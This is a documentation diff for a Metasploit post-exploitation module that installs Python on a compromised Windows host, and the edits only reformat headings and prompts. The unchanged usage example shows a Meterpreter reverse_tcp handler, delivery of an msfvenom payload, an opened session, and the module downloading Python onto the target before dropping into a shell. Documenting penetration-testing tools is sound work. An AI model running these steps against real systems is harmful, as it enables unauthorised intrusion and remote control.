@@ -26,20 +26,20 @@ This module has been tested against:
 
 
 ## Options
-  **PYTHON_VERSION**
+### PYTHON_VERSION
 
   Specifies the Python version you would like to download. Downloads Python version 3.8.2 by default.
 
-  **PYTHON_URL**
+### PYTHON_URL
 
   Specifies the URL used to download the Python embeddable zip file.
 
-  **FILE_PATH**
+### FILE_PATH
 
   Specifies the directory to place the Python embeddable zip file.
   Places Python zip file in the current working directory by default.
 
-  **CLEANUP**
+### CLEANUP
 
   If true, this option will delete the Python zip file as well as its extracted contents. It will also terminate running processes with name 'python', as you cannot delete the Python interpreter if it is actively running.
 
@@ -47,20 +47,20 @@ This module has been tested against:
 
 Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to the target system via web server, SMB, etc. Execute the payload to get a session.
 
-    msf5 > handler -H 0.0.0.0 -P 4444 -p windows/meterpreter/reverse_tcp
+    msf > handler -H 0.0.0.0 -P 4444 -p windows/meterpreter/reverse_tcp
     [*] Payload handler running as background job 0.
 
     [*] Started reverse TCP handler on 0.0.0.0:4444
-    msf5 >
+    msf >
     [*] Sending stage (180291 bytes) to 192.168.13.129
     [*] Meterpreter session 1 opened (192.168.13.130:4444 -> 192.168.13.129:50069) at 2020-03-04 20:32:59 -0500
 
 Use the post module to install Python on the target filesystem
 
-    msf5 > use post/windows/manage/install_python
-    msf5 post(windows/manage/install_python) > set SESSION 1
+    msf > use post/windows/manage/install_python
+    msf post(windows/manage/install_python) > set SESSION 1
     SESSION => 1
-    msf5 post(windows/manage/install_python) > exploit
+    msf post(windows/manage/install_python) > exploit
 
     [*] Downloading Python embeddable zip from https://www.python.org/ftp/python/3.8.2/python-3.8.2-embed-win32.zip
     [+] Compressed size: 1112
@@ -73,7 +73,7 @@ Use the post module to install Python on the target filesystem
 
 Verify Python works
 
-    msf5 post(windows/manage/install_python) > sessions -i 1
+    msf post(windows/manage/install_python) > sessions -i 1
     [*] Starting interaction with 1...
 
     meterpreter > shell
